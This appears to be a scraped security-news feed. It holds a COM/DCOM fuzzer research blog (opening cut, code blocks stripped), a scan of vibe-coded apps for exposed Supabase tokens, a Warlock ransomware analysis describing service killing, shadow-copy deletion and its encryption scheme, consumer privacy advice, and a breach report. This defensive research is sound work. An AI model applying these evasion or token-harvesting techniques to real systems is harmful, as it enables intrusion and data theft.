Of course this was easier said than done, who would’ve thought. However, a large part of the MS-RPC-Fuzzer design could be reused for this project! First, we need a way to collect COM class information, the interfaces it holds and the interface it’s procedures. Each procedure has a definition with the input parameters it takes, example: Proc5(string p0, int p1, NtApiDotNet.Ndr.Marshal.NdrUnsupported p2).The first problem is parameters and a parameter its input value. This is also the most important factor for the fuzzer, because it will need to contain a value that will hopefully identify interesting COM classes. For fuzzing web applications this is a rather easy step, we can just always send strings. But for COM, there are more parameter types than just strings.We don’t need or even can provide each type with a value. The most essential types for the fuzzing are the primitives (Strings, Integers, etc.) and arrays. We can provide these with random values with different sizes or lengths.In summary, the COM fuzzer implement two functions: One function  will be responsible for extracting all parameters of a Method (procedure) and will call the other function  to provide it a value.Some types are “complex” like NtApiDotNet.Ndr.Marshal.NdrUnsupported and we cannot provide them a value. However, we will need to provide the procedure the right format parameter type if we want to fuzz it. For example, when a procedure takes a string input parameter and a complex input parameter, we still want to fuzz the string input for that procedure.To solve this, we can dynamically create an instance for the parameter using PowerShell reflection:The “complex” parameter type will most likely be provided with a value that the COM server will reject, because it expects some kind of value. However, this will provide us with the right parameter type so that we can still fuzz the other input parameters like strings.flowchart TD

Let’s take a step back. Before we can actually start fuzzing, we need to collect the required information to do so. The fuzzer implements a cmdlet  that can collect the COM class information from different input types; whole registry, COM database file, a specific CLSID or a list of CLSID’s.In the following example we tell  to extract the information for the CLSID 13709620-C279-11CE-A49E-444553540000:The required argument is , which tells the function where to export the results to. This is in the form of a JSON file. The following is a small part of the file that was generated using the above example:1

Why exporting it to a JSON file instead of directly fuzzing from the parsed CLSID you may ask. The answer to that is efficiency and time.Creating an COM object isn’t always instant. Sometimes, the system is not able to create a COM object for the parsed CLSID and will error AFTER a timeout of around a minute.Some interfaces hold procedures that crash PowerShell, having a JSON file allows you to remove the interface from the file so that the fuzzer won’t fuzz that interface.In general, when the JSON file was created for a COM class, you can always use it to fuzz because nothing will change, which is the case with, for example, RPC endpoints. The COM class may have a different implementation on another version of Windows, or after an update. But in general it should work when copying and pasting it to another system.Windows (11) contains a lot of COM classes:While the tool is capable of fuzzing every class, it still would take a lot of time to do so. So it’s better to have a specific set of COM classes where to focus on. The tool can filter some classes in different contexts; Remotely accessible classes, classess initiated from services and interactive user COM objects.For example, we can point the  to collect COM classes initiated from services:This is also the reason the COM-fuzzer comes with 3 templates for COM classes that anyone can use to start fuzzing quickly. These are; ,  and .For some COM classes there is a bug when creating a COM object, after a specific amount of time, the PowerShell session crashes AFTER already having created the object. So imagine the following scenario; we parse 100 COM classes and COM class on index 18 causes the PowerShell session to crash, but it will do so after some time while the function for collecting the information is already at index 84. One more reason to export the results to a JSON file instead of directly fuzzing.During my research, I identified some of these classes and hard code blacklisted them in the  function. It could be that there are more COM classes/objects that show this behavior, so be aware of that when using the tooling.Let’s get back to the fuzzing process. Once we determined the parameter type, the fuzzer provides it with a value, either standalone or within an array. The function  can be parsed with parameters like minimal string length or minimal integer size. The function takes the parameter type as value and then uses random to generate the input. As an example, the case for a  parameter type is given:1

You may notice the  variable. This is an important deal for the fuzzer to know where our input landed and determine relationships.The canary method is used to expose an information leak by giving different versions of a sensitive document of several suspects and seeing which version gets leaked. In our case, for string parameter types, we send a recognizable string and attach a random value to it. Example:To find the information leak (know where our input lands in the background), we will need a tool that can monitor processes in the background of the Windows system. The ideal tool for this is Process Monitor. Process Monitor is an advanced monitoring tool for Windows that shows real-time file system, Registry and process/thread activity.While having Process Monitor listening in the background, we can start our fuzzer. When we apply a filter in Process Monitor that includes our recognizable part of the string e.g., , we can see where our fuzzing input landed and what kind of function calls are being made with our input.Process Monitor with canary as applied filterWhen you know which process ID (PID) is making the request, a next step would be to filter the specific PID and look for further calls it makes. A user can now export the Process Monitor results into a CSV file. The fuzzer provides the  cmdlet to import the data into Neo4j. More about this in a later chapter.Remotely invoking procedures is also possible (DCOM). Although you will need high privileges to actually invoke the COM call on the remote system, the fuzzer includes an option to do so. Using the  together with the credentials of the user that is allowed to invoke the COM call, it will fuzz COM on the remote system instead.This works by first parsing the user provided arguments to . This creates a credential object which then gets parsed to . By default,  uses the following authentication level configuration:AuthnSvc:        WinNT
AuthnLevel:      PKT_PRIVACY
ImpLevel:        IMPERSONATE
Capabilities:    None
Which should be fine for most tasks. To figure out if a COM class can be activated and executed remotely, OleViewDotNet’s cmdlet Format-ComSecurityDescriptor can help:1

Perfect for discovering new lateral movement techniques ;).While the fuzzer is running, it will store the results into separate JSON files. These are allowed.json and denied.json depending on the returned message. The structure of the result file looks something like:1

It stores the input, the output and windows message according to the integer found in the output. But this json file can easily get as big as 50.000 lines. Also, from a JSON structure it is quite hard to see the relations. This calls for a solution that can provide us with tooling that makes analysis easy.The fuzzing results are obtained within standalone JSON files, so a user can do analysis however he likes. Showing the relation between COM class, interface, procedure, input and output is a effective way to get a better understanding about the COM implementation. For this, I chose to reuse the Neo4j wrapper from my MS-RPC-Fuzzer. I rewrote some of the functions to import our JSON files to a (remote) Neo4j database.The user can provide the JSON file and pipe it to the cmdlet :To query the data in Neo4j, the Cypher language is used to make the relations. The following Cypher is an example:This query looks for high privileged file operation function calls. What does this mean? I wrote a rule that when a high privileged identity, like  is making the function call, or it is impersonating this identity, and the function call contains , it will mark it as an  node.Viewing relationships in Neo4j with high privileged file operationsViewing this relationship is only possible because we combined both our fuzzing input and the Process Monitor results into the same Neo4j database. In the above example, a file is being written with our user input provided as NT AUTHORITY\LOCAL SERVICE.To do this, the user should first import the fuzzing results into Neo4j:Next, the user should export the Process Monitor results into a CSV file and import it to Neo4j:By default, the value for the canary is . But you can change this while fuzzing using the  argument with . Make sure to change the canary value for  as well if you changed this.In summary; the fuzzer has 3 phashes; inventarize (collecting information), fuzzing and analysis.graph TD

First, specify a target to . This can be the whole registry, a specific CLSID, a list of CLSIDs or a COM database file. This will output a JSON file , containing the classes their CLSIDs, interfaces and procedures, which the user can parse to the fuzzer. If there is no target specified, it will default to the entire registry.The fuzzer , takes the exported JSON file from the previous phase as required input. The fuzzer will output maximal 2 JSON files and one log file. It will write the COM calls before invoking them to , this way if there is a crash (BSOD), the user will know which call was responsible (last line).It will separate the fuzz results into 2 JSON files:Fuzzed inputs that lead to Access DeniedThe user can use the JSON files for analysis as he likes. However, the fuzzer has an option to import them into your Neo4j instance using the  cmdlet. The fuzzer has a data mapper that makes relations for the data, easy as that.The whole idea is to gain insights into COM/DCOM implementations that may be vulnerable using an automated approach and make it easy to visualize the data. By following this approach, a security researcher will hopefully identify interesting COM classes/implementations in such a time that would take a manual approach significantly more.While some very interesting COM classes were identified during my research, for now only CVE-2025-59253 got assigned. This shows that the tool is effective and can be used to discover new vulnerabilities. A big surface has not been properly analyzed. While COM/DCOM can lead to interesting bugs or vulnerabilities, it was never said that it reveals its secrets easily ;) (even with a fuzzing approach).COM (Component Object Model) and DCOM (Distributed COM) have been interesting components in Windows from a security perspective for many years. Diving into the implementation and internal workings of COM/DCOM was an interesting topic that I had on the planning for quite some time.Because of the design of the MS-RPC-Fuzzer, a large part of the COM-Fuzzer design could be recycled. While the fuzzer can reveal interesting COM/DCOM implementations, it is still blackbox fuzzing. This means that when we invoke a COM procedure, we are not sure what actually is going to happen. Using external tools such as Process Monitor while fuzzing helps to get a better understanding, but in the end, a researcher will still to reverse the actual implementation to know exactly what is going on. This fuzzer will hopefully identify the COM classes that are worth for further analysis, like reversing the server.I’m glad the fuzzing approach once again proves that it can be effective on different disciplines, like COM/DCOM, as CVE-2025-59253 was assigned during my research.While effective, the tool can be improved in future work. For example, the bug as described in chapter 3.2.3 COM objects and crashes is something that will probably lead to issues while gathering COM-data for many classes. At some time I plan to filter out more classes that lead to the problem and get to the root cause of this and hopefully fix it/work around it without needing a blacklist.While fuzzing, the PowerShell session can crash once again. I’ve tried to identify some of these classes for which this is the case and added them to  within the repository. The file can be parsed with the argument . While this works around the problem, it is again better to get to the root cause of this problem and fix it.Some procedures take long to finish/execute or even hang. While you can use the argument  for this with a specific procedure, it still is annoying. So in the future it will probably be wise to implement a time out. While this is tricky in PowerShell, the requirement to have OleViewDotNet installed beforehand makes this slightly easier (so the module doesn’t have to be important each time when working with jobs.)Finally, new approaches to fuzzing COM/DCOM implementations can be implemented in the future. Things like the  path argument or the  option can lead to new insights, pherhaps more of these options will be added in the future.OleView.NET (tyranid / James Forshaw) .NET reimplementation of Microsoft’s OLE/COM Object Viewer, useful for inspecting COM type libraries, registered classes, interfaces and typelib metadata when analyzing COM/RPC surfaces.COM-Fuzzer (Remco van der Meer) Fuzzing framework for exercising COM interfaces to discover parsing bugs, memory corruption, and unexpected behaviors in COM servers.MS-RPC-Fuzzer (Remco van der Meer) Fuzzer specialized for Microsoft RPC (MS-RPC) endpoints and automates generation and delivery of malformed RPC requests for stability and crash analysis.

Purpose-built platforms like Lovable.dev, Base44.com, and Create.xyz have democratized application development, enabling non-developers to deploy full-stack applications without writing a single line of code. Just ask your colleagues on the marketing team what they've already deployed or experimented with under the hood! ;) As vibe-coded applications become more accessible, inexperienced users are creating fresh risks.Our research team analyzed over 5,600 publicly available applications and identified more than , , and  (including medical records, IBANs, phone numbers, and emails).Unlike other published articles on that topic, the goal of this research was to move beyond isolated case studies by identifying issues at scale that would otherwise require hours of manual work to uncover.You can review the complete results in our comprehensive report. Meanwhile, in this article, we'll show you the methodology that guided us to these impressive findings.To collect and analyze our dataset, multiple domain sources were leveraged, including official launch directories (e.g., launched.lovable.dev), Shodan indexing, Reddit communities, and manual crawling.First, we retrieved data from launched.lovable.dev to compile a dataset of 4,000 web applications. We then expanded our target set using additional sources, including lovable.dev, base44.com, vibe-studio.ai, bolt.new, create.xyz. Afterward, we performed subdomain enumeration on these domains to identify additional targets.Following a cross-source analysis of the aggregated dataset, we derived three independent fingerprinting methods for detecting Lovable-based web apps:After developing a fingerprint for the Lovable web app, we used Shodan to locate live instances of web apps that appear to be implemented with Lovable. To further augment the dataset, we scraped curated posts and comment threads from the Reddit communities r/lovable and r/base44.The resulting URLs were curated through a multi-stage process:Deduplication to remove redundant entriesAutomated reachability checks to exclude dead hosts: we filtered live assets by checking whether each main page returned an HTTP status code in the 200–399 rangeFiltering to distinguish between non-application landing pages and functioning deployments.Initial platform coverage included Lovable (~4,000+ applications discovered), Base44 (~159), Create.xyz (~449), Vibe Studio, and Bolt.new (smaller samples).The data collection was conducted as a one-time process. During collection, several limitations were deliberately imposed to ensure legal and ethical compliance. Domains that could be reasonably identified as educational or health-related were excluded, as typical users are not authorized to probe such systems. This exclusion reduced coverage but ensured adherence to established ethical norms of web crawling and security research.We acknowledge several sources of potential bias in our methodology: Reliance on launch directories, Shodan, and community postings may overrepresent applications that are actively promoted or easily discoverable, while underrepresenting private or restricted deployments. As data collection was performed once, the dataset represents a snapshot in time. Applications and platforms evolve rapidly; vulnerabilities may have been patched or newly introduced since collection. The dataset is heavily skewed toward Lovable deployments, with substantially fewer applications discovered for Base44, Create.xyz, Vibe Studio, and Bolt.new. This imbalance may disproportionately influence prevalence measurements.At the same time, focusing on domains openly accessible to anyone online gives us a useful window into how these applications are actually built and used in practice. This approach highlights the security habits (and mistakes) that most often appear in real deployments, especially when apps are created by people with little security background.Looking at this public-facing slice of the ecosystem helps us see not just isolated flaws, but broader patterns across sectors.After the dataset was curated, the next stage of the methodology focused on systematically mapping the attack surface of each application, i.e., extracting all hosts, web apps, and APIs exposed by the domains we found (further defined as “assets” fed into Escape’s Attack Surface Management scanner). Our goal was to build a structured model of each application’s externally visible footprint and then subject high-value pieces of that footprint to dynamic testing.As a platform, Escape is a collection of security scanners. A typical Escape’s ASM scanner is a tool that automates the identification of all exposed assets, correlates them, and helps prioritize which ones are most likely to be exploited. Its scanner structure can be seen as follows:The scanner first ingests the “assets”. In our case, these assets include hosts, web apps, APIs, and schemas. The scanner then proceeds through a multi-step process of validation and reachability checks, followed by fingerprinting and metadata collection (such as WAF, cloud provider, framework, and GeoIP). This process ensures that only valid, accessible assets are mapped and ready for further testing.Once the assets are identified, they are classified into the discovery phase. We relied on a layered discovery strategy to maximize coverage while minimizing intrusiveness:Domain and host discovery. Subdomain enumeration and passive indices were used to enumerate hosts associated with each base domain. As mentioned before, we validated reachability via benign HTTP(s) probes and excluded hosts that returned only generic landing pages.Web crawling and route enumeration. A headless-browser crawler rendered pages and followed links, collecting URL structures, JS bundles, and client-side routing artifacts.Static frontend analysis. JavaScript and HTML were parsed to extract embedded API endpoints, fetch/XHR/WebSocket URLs, inline tokens or keys (when present in the public bundle), and configuration objects that reveal backend schemas or third-party integrations.Endpoints discovered in JS, observed in network traces during crawl sessions, or exposed via documented routes were collated into service models. When available, open schema fragments (e.g., JSON responses illustrating resource shapes) were used to infer parameterization and access control points. We also performed API discovery by brute-forcing API paths, i.e., testing for common paths at scale and identifying API-like responses.By feeding the data collected during the discovery process into the scanner, we built a comprehensive, continuously updated map of each application's publicly visible footprint.While analyzing the structure of specifically Lovable websites, we came across the integration of Lovable and Supabase. In this structure, we specifically identified and targeted APIs integral to the application’s functionality that could be discovered and analyzed at scale.During our analysis, we also discovered that anonymous JWT tokens were exposed in the JavaScript bundles of the Lovable front end. These tokens were linked to PostgREST APIs as part of the Supabase backend integration. According to the documentation, Supabase “automatically generates a RESTful API from the database schema, allowing applications to interact with the PostgreSQL database through an interface, all from the browser.”However, while Supabase's default security rules are permissive for development, they leave important security gaps if not properly configured before going live. Specifically, Row-Level Security (RLS) policies must be implemented to ensure that only authorized users can access or modify specific rows in the database, such as ensuring that users can access only their own data. The issue arises when RLS is misconfigured between the API layer and the database. This creates security risks, as unauthorized access could occur if JWT tokens (used for authentication) are exposed in the frontend code.Therefore, while Lovable can assist in generating RLS policies, it is vital for users to manually review these policies (which can be a challenge for less experienced “vibe coders”).Introduction of Lightweight DAST Surface Scanning  or "Visage Surface Scanner"Given the structure of the integration between Lovable front-ends and Supabase backends via API, and the fact that certain high-value signals (exposed keys, for example, anonymous JWTs to APIs linking Supabase backends, client-side routes, embedded endpoints) only appear in frontend bundles or source output, we introduced a lightweight, read-only scan to harvest these artifacts and feed them back into the ASM inventory.We called this scanner the Visage Surface Scanner. Unlike previous versions, this scanner is less in-depth: it doesn't execute any actions on the web application or trigger processes. Instead, it analyzes source code and frontend responses to identify secrets or routes that can be added to the asset inventory in our Attack Surface Management tool through a feedback loop.The Visage Surface scanner was integrated into the Attack Surface Management (ASM) web app scanner, enabling us to scan Lovable web apps for vulnerabilities and identify exposed anonymous JWT tokens and Supabase API routes. These findings were then fed into the Escape API-focused Business Logic Security Testing Scanner, where they were analyzed for real-world security issues:After adding the discovered URLs to the ASM and running the Visage Surface Scan, we now discovered in total  assets in the ASM, composed of: schemas (found and generated via frontend traffic)These assets were then filtered and organized into an Attack Surface Management (ASM) per application within Escape’s platform that included:Web application entry points and client routesREST/GraphQL/WebSocket endpoints and their observed request/response shapesAuthentication and session management endpointsThird-party integrations and service endpoints (e.g., Supabase, analytics, storage)Security Testing and Dynamic AnalysisOnce the attack surface was extracted and modeled, we applied targeted security testing using in-house dynamic application security testing (DAST) techniques (see more info on the web app scanner here and the API scanner here). The objective was not to exhaustively exploit weaknesses, but to identify recurring classes of misconfigurations and vulnerabilities in a safe, controlled manner.We ran DAST scans in a “passive” mode, explicitly configured to avoid destructive operations, high-volume brute force attempts, or payloads that could disrupt target services. This design choice was made to respect ethical and legal boundaries and to minimize unintended impact on live deployments. While this conservative approach ensures safety, it also introduces an important bias: the results presented here are lower-bound estimates. Running Escape’s full scanning capabilities (e.g., injection payloads, deeper fuzzing, and aggressive brute-force) would almost certainly surface a larger volume of issues, including higher-severity vulnerabilities.All REST API endpoints passed our REST DAST scan, using the schema produced by the Visage Surface scanner and the credentials stored in the web application. We attempted to implement an automated registration agent for the web application to provision an account, execute a comprehensive scan, and forward the resulting authentication token to the REST DAST tool.Two important observations shaped the testing results:Most vulnerabilities were exposed without authenticationAcross platforms, critical weaknesses (e.g., exposed Supabase tokens, misconfigured APIs, and missing row-level security) were accessible directly through public endpoints. Tokens such as Supabase service keys were often trivially retrievable from frontend bundles, underscoring that many security issues in vibe-coded apps exist “in the open,” without requiring any privileged access. If we decided to go more in-depth, we could develop an AI-driven auto-authentication system that leveraged headless browser automation and agent-based orchestration.2. Results understate the true riskBecause scans were run in a passive mode, the findings reflect only a subset of exploitable issues. A more aggressive testing configuration would likely have uncovered additional vulnerabilities with greater impact. In this sense, our findings represent a conservative baseline rather than the full extent of the security risks present in these ecosystems.Data Cleanup and VerificationAfter running the ASM-driven DAST scans, the raw output contained a large volume of findings with the Escape platform, ranging from high-confidence exposures to some noisy signals. To ensure that only meaningful vulnerabilities and secret disclosures were included in our analysis, we applied a multi-stage cleanup and verification process.Deduplication and NormalizationDeduplication and normalization were performed automatically by the Escape platform, which consolidated findings across multiple discovery vectors.Verification of Exposed SecretsPattern-based filtering: Escape applied platform-specific rules to distinguish genuine credentials (e.g., API keys, Supabase tokens, environment variables) from placeholders or noise.False-positive reduction: Values resembling generic identifiers (UUIDs, hashes, opaque IDs) were automatically flagged and excluded if not usable as credentials.Safe live validation: Where legally and ethically permissible, exposed tokens were tested against non-destructive requests to public endpoints to verify validity. Tokens granting elevated privileges (particularly Supabase service role keys) were flagged as critical exposures due to the level of access they provided.Vulnerabilities suggesting missing or weak authentication were validated by replaying requests without tokens or with modified headers to confirm whether access restrictions were enforced.Manual spot-checks. A representative subset of findings was manually validated to assess the precision of automated classification and to calibrate severity scoring.It is important to note that the cleanup and verification process was intentionally conservative. Only findings that could be confirmed with high confidence were retained. As a result, the vulnerabilities and exposed secrets presented in this study represent a verified baseline rather than the full universe of potential issues.Mapping out the attack surface of these vibe-coded applications wasn’t easy, but it was necessary. By taking a comprehensive approach to identifying exposed assets and vulnerabilities, we uncovered risks that would otherwise go unnoticed. Our study reveals that these vulnerabilities are spreading across diverse websites, industries, and asset types. As the vibe coding phenomenon continues to explode, especially within modern tech industries, the challenge grows. Even though users may be increasingly tech-savvy, many still lack critical security awareness. As a result, the risks are only amplifying.Organizations must respond quickly to these threats by adopting best practices to protect their assets. The sooner they act, the better.]]></content:encoded></item><item><title>A Deep Dive Into Warlock Ransomware Deployed Via ToolShell SharePoint Chained Vulnerabilities</title><link>https://hybrid-analysis.blogspot.com/2025/10/a-deep-dive-into-warlock-ransomware.html</link><author>/u/CyberMasterV</author><category>netsec</category><pubDate>Thu, 30 Oct 2025 15:38:29 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Warlock ransomware was deployed by exploiting the SharePoint vulnerabilities  and The malware includes a hostname verification mechanism that excludes designated systems from encryption, indicating self-preservation tacticsWarlock performs defense evasion by stopping a list of services and processes and removes volume shadow copies The ransomware encrypts files using a combination of the  algorithm and Warlock ransomware has been recently found being distributed through newly discovered SharePoint vulnerabilities. This malware represents the latest evolution in ransomware tactics, combining advanced encryption methods with targeted defense evasion techniques.As a result, we have conducted a comprehensive analysis of Warlock, examining both its initial behavior through sandbox environments and performing detailed static and dynamic analysis of samples in the wild. The findings reveal a methodical attack pattern designed to maximize damage while protecting itself from detection and removal.The ransomware exploits two critical SharePoint vulnerabilities ( and ) as its entry point, then deploys a multi-stage attack that includes terminating security services, removing recovery options, and implementing a hybrid encryption scheme using  and  algorithms.Perhaps most telling is Warlock's self-preservation mechanism—a hostname verification feature that deliberately avoids encrypting certain systems, suggesting a calculated self-preservation approach built by its operators.A Hybrid Analysis PerspectiveAs we can see in the Hybrid Analysis report, the ransomware appends its extension to the existing one:Figure 1 - Warlock ransomware’s extension identifiedFigure 2 reveals that the malware is looking to open and possibly stop multiple services related to backup, databases,  shadow copies, AntiVirus software, and so on.Figure 2 - Multiple services are targetedHybrid Analysis identifies that the sample implements the  algorithm for encryption using YARA rules (Figure 3).Figure 3 - ChaCha20 algorithm identifiedFigure 4 - CryptoPP library is statically linkedThe  API is utilized to empty the Recycle Bin in order to avoid possible file recovery from the location:Figure 5 - SHEmptyRecycleBinW API callA Deeper Dive Into WarlockThe process retrieves the command-line arguments and compares them with the following list: “” (doesn’t change the extension of the file passed as a parameter), “” (doesn’t create the ransom note) and “”.Figure 6 - Command-line arguments retrievalThe threat actor embedded a GUID in the code that will appear in all encrypted files. The ransomware also implements a check (skipping files encryption) for a placeholder that should be a hostname called “”.Figure 7 - Hard-coded informationThe malware hides the current window via a function call to  (0x0 = ):Figure 8 - Malware’s window is hidden is used to empty the Recycle Bin on all drives (0x7 = SHERB_NOCONFIRMATION | SHERB_NOPROGRESSUI | SHERB_NOSOUND):Figure 9 - Empty the Recycle BinWarlock mounts all unmounted volumes using the , , and  functions.Figure 10 - Mount all unmounted volumesThe ransomware stops a list of services (i.e. AntiVirus, backup, shadow copies) using the  method (0x1 = ). The entire list of services can be found in the Appendix.Figure 11 - Targeted services are stoppedThe executable stops a list of processes that might interfere with the encryption. The list of all processes can be found in the Appendix.Figure 12 - Targeted processes are killedVolume Shadow Copies DeletionThe ransomware deletes all volume shadow copies by calling the  function and then  on every shadow copy found (see Figure 13).Figure 13 - Delete volume shadow copies using COM interface is used to retrieve the drive type, which must be different than 0x1 () and 0x5 ():Figure 14 - GetDriveTypeW API callThe following files and directories will  be encrypted by Warlock Ransomware:Figure 15 - Skipped files and directoriesThe malware creates multiple threads that will handle the file encryption. Firstly, it appends the “.” extension to every file to be encrypted using :Figure 16 - Append the ransomware’s extension to encrypted filesThe ransomware uses  (CryptoPP library) and  for encrypting files. It calls  to generate 32 random bytes (session private key), computes the 32-byte session public key using , and then computes the 32-byte shared secret using the session private key and a hard-coded 32-byte public key. The  key is the SHA256 of the shared secret and the IV is equal to the first 8 bytes from the key. The entire workflow is highlighted in the figure below. The threat actor can recover the shared secret using the session public key that is written to the encrypted file and the secret private key that corresponds to the hard-coded public key.Figure 17 - Generate the shared secret using Curve25519Figure 18 - Hard-coded 32-byte public keyThe ransomware traverses the directories and encrypts the files using :Figure 19 - Open targeted file for encryptionFigure 20 - Write encrypted content to the fileA snippet of the  implementation is displayed in Figure 21.Figure 21 - ChaCha20 algorithmAn example of an encrypted file is displayed below.

The analysis identifies the ransomware's unique file extension and confirms its use of the ChaCha20 algorithm for file encryption. A significant indicator of malicious intent is the ransomware's systematic termination of backup and AntiVirus software services. The in-depth technical analysis provides crucial evidence from the dynamic analysis and describes the volume shadow copies deletion process, as well as every step of the complex file encryption workflow. Hybrid Analysis is a powerful platform for identifying and analyzing malware, whether mundane or highly sophisticated.

It’s your likes, reviews, comments, and all the little traces you didn’t mean to share. Together, they paint a picture of you—one that friends, employers, and yes, scammers can see.Your active footprint is everything you choose to share online. Every photo, product review, or status update you post adds another brushstroke to your online portrait. Over time, those choices form a public story about who you are—your interests, values, and connections. That story shapes how people, employers, and even algorithms see you.Your passive footprint is the quieter one—the data you leave behind without meaning to. Every website you visit, every cookie that tracks your clicks, every photo that quietly tags its GPS location adds to it. These fragments often work in the background, invisible but persistent, quietly mapping your habits, preferences, and even your movements.You step in more stuff than you thinkYour personal data is scattered in more places than you’d expect. Social networks like Facebook, LinkedIn, and TikTok hold snapshots of your life and relationships. Government databases, company websites, and news mentions might hold your name or location. Forums, review sites, and shopping accounts keep their own records. And data brokers collect and sell huge bundles of personal details, sometimes packaging them into lists anyone can buy. Even if you’ve never shared something directly, chances are it’s already out there.Alone, small details don’t seem like much—a nickname here, a photo there—but stitched together they can reveal a lot. Your job title, home city, favorite restaurant, even your pet’s name (a popular security question!) can help someone impersonate or target you. Combine that with info leaked in data breaches, and attackers can build an eerily complete version of you—ready-made for scams or identity theft.How scammers collect your dataTo stay safe, it helps to see the world the way a scammer does: your online details are puzzle pieces, and they’re putting the picture together.Attackers use automated tools to pull information from public pages across the internet. That can include your bio, job history, or photos from social media, or your name and email address from company websites and online forums. All technically “public,” but when combined, they create a full dossier of your online life.When companies get hacked or fail to secure their databases, your data can spill into the open. Big names like Equifax, LinkedIn, and Yahoo have all been hit. Leaks like these often contain names, addresses, phone numbers, and passwords—and once data hits the dark web, it can circulate for years. That’s why old breaches can still come back to haunt you.Data brokers legally collect information from public records and commercial sources, then sell detailed profiles for advertising and risk scoring. On the dark web, things get murkier: stolen logins, payment info, and even full identity kits (“fullz”) are traded by criminals. You’ll never meet these markets—but your data might end up there anyway.Social engineering is where information meets manipulation. Attackers blend the details they find—your social posts, work info, or breached credentials—to make scams feel real. They might impersonate your boss, your bank, or even . These scams work because they sound familiar, borrowing the tone and timing of real interactions.Here are just a few examples of how personal content shared online—even casually or lovingly—can be reused in ways you’d never imagine.AI voice scams that sound heartbreakingly realWhen a mother in the US received a call from her daughter saying she’d been in a car accident and needed bail money, she didn’t hesitate to help. The voice on the other end sounded exactly like her, but it wasn’t. It was an AI-generated clone.Scammers don’t need much to pull this off—just a few seconds of clear speech. That could come from a TikTok clip, a podcast snippet, a YouTube video, or even a Facebook post where your child’s voice can be heard in the background. Once they have that audio, AI tools can replicate tone, emotion, and phrasing so accurately that even family members struggle to tell the difference.The Facebook photo that gives away your locationYou don’t need to tag your location for someone to find you. A recent Malwarebytes investigation showed how AI can now identify where a photo was taken just from the background—down to the street, storefront, or skyline. That means every sunny brunch pic or family snapshot on Facebook could quietly reveal where you live, work, or spend time.Attackers can use this information to craft more convincing local scams—pretending to be from nearby businesses, schools, or community groups to earn your trust. It’s a sharp reminder that even innocent photos can expose more than you intend.When scammers know just enough to sound officialEarlier this year, Californians were hit with a wave of fake tax refund texts and emails. The messages looked convincing—complete with government logos, correct refund amounts, and links to realistic-looking sites. But the senders weren’t tax officials. They were scammers who had pieced together public and leaked data to make their messages sound real.That data can come from anywhere—a tagged post that shows you live in California, a LinkedIn page that lists your workplace, or a data broker that sells demographic info. When combined, these fragments let criminals target specific regions or groups, making their scams feel personal and timely.S – Share less, on your termsTighten privacy settings on your social accounts so only people you trust can see your posts. Avoid oversharing—travel plans, birthdays, and addresses are gold for scammers. And skip those “fun” quizzes and surveys; they’re often data collection traps in disguise.Use a password manager to create strong, unique passwords for every account. Turn on multi-factor authentication (MFA) wherever possible. Avoid using personal details—pets, schools, hobbies—in passwords or security questions.Set up Google Alerts for your name and nicknames to see when new information about you pops up. Run a free scan with Malwarebytes Digital Footprint Portal to find out if your email appears in data breaches, and change affected passwords fast. Many banks and credit cards also offer free identity monitoring—use it.Treat surprise messages and calls with healthy skepticism, especially if they sound urgent. Verify requests by going directly to official websites or contact numbers. And talk to family about scams—kids and seniors are often the most common targets.Your digital footprint tells a story, but you don’t need to vanish from the internet, just manage what you leave behind. A few small, consistent habits can keep your online shadow short, sharp, and safely under your control.We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline. If something looks dodgy to you, check if it’s a scam using Malwarebytes Scam Guard, a feature of our mobile protection products.

The largest disclosure came from the Oregon government, which reported a total of 10.5 million affected US residents. Additional notices listed 4 million in Texas, 76,000 in Washington, and several hundred in Maine.Even if you’ve never heard of Conduent, you could be one of the many people caught up in its recent data breach. Conduent provides technology services to several US state governments, including Medicaid, child support, and food programs, with the company stating that it “supports approximately 100 million US residents across various government health programs, helping state and federal agencies.”“On January 13, 2025, we discovered that we were the victim of a cyber incident that impacted a limited portion of our network.”An investigation found that an unauthorized third party had access to its systems from October 21, 2024, until the intrusion was stopped on discovery.Breach notification letters will be sent to affected individuals, detailing what personal information was exposed. According to The Record, Conduent said more than 400,000 people in Texas were impacted, with data including Social Security numbers, medical information and health insurance details. Another 76,000 people in Washington, 48,000 in South Carolina, 10,000 in New Hampshire and 378 in Maine were also affected. Conduent has filed additional breach notices in Oregon, Massachusetts, California, and New Hampshire.The stolen data sets may include:​If all of those apply, it’s certainly enough for criminals to commit identity theft. SafePay, which emerged in late 2024, threatened to publish or sell stolen data if its demands weren’t met, claiming to have exfiltrated a staggering 8.5 terabytes of files from Conduent’s systems. Though relatively new on the scene, SafePay has quickly built a reputation for large-scale extortion targeting high-profile clients globally.Breaches like this reinforce the need for robust cybersecurity and incident response in the public sector. For the potentially millions of people affected, stay alert to fraud and identity theft.Protecting yourself after a data breachCheck the vendor’s advice. Every breach is different, so check with the vendor to find out what’s happened and follow any specific advice it offers. You can make a stolen password useless to thieves by changing it. Choose a strong password that you don’t use for anything else. Better yet, let a password manager choose one for you. If you can, use a FIDO2-compliant hardware key, laptop, or phone as your second factor. Some forms of 2FA can be phished just as easily as a password, but 2FA that relies on a FIDO2 device can’t be phished.Watch out for fake vendors. The thieves may contact you posing as the vendor. Check the company’s website to see if it’s contacting victims and verify the identity of anyone who contacts you using a different communication channel. Phishing attacks often impersonate people or brands you know, and use themes that require urgent attention, such as missed deliveries, account suspensions, and security alerts.Consider not storing your card details. It’s definitely more convenient to let sites remember your card details, but we highly recommend not storing that information on websites.We don’t just report on threats – we help safeguard your entire digital identityCybersecurity risks should never spread beyond a headline. Protect your—and your family’s—personal information by using identity protection.]]></content:encoded></item><item><title>New &quot;Brash&quot; Exploit Crashes Chromium Browsers Instantly with a Single Malicious URL</title><link>https://thehackernews.com/2025/10/new-brash-exploit-crashes-chromium.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiNPzPbEzMX4dgK-yQVcB_TZXkH8V42XYSGCEGgQzI6P0g0Mm4ozB-fC14LrYJw5mZfhA0swpNl5ZAs86tjzY7ayJGrewr7fH0S8rFsua_8J-C8ImR-04v88SotHPlzODcEHnMTAx_RGrpZHs0g9xYJ_bwsjnHIhDtIm105OhACGkcForfh0W9NmcurastV/s1600/brach.jpg" length="" type=""/><pubDate>Thu, 30 Oct 2025 14:45:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[A severe vulnerability disclosed in Chromium's Blink rendering engine can be exploited to crash many Chromium-based browsers within a few seconds.

